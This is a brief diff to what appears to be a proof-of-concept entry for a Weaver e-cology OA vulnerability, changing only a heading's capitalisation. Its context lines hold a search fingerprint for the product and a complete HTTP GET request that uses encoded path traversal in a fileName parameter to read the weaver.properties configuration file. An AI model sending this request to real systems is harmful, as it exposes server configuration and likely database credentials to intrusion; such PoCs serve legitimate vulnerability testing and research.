@@ -5,7 +5,7 @@
 app="泛微-OA（e-cology）"
 ```
 
-## poc
+## POC
 ```
 GET /api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_%2f%2e%2e%2fweaver%2eproperties HTTP/1.1
 Host: 127.0.0.1
